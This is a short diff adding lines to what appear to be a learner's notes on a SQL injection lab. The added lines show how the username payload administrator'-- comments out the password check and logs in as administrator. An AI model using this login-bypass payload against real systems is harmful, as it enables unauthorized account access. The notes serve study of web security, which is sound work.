@@ -16,3 +16,8 @@ SELECT * FROM users WHERE username = 'admin' AND password = 'admin'
 SELECT * FROM users WHERE username = ''' AND password = 'admin'
 ```
 - as there is no username with ( ' ) it gave internal server error
+- what we can do is let it log in administrator and ignore the rest of the query like this
+```
+SELECT * FROM users WHERE username = 'administrator'--' AND password = 'admin'
+```
+- with the payload ( administrator'--) in username field and anything in the password field
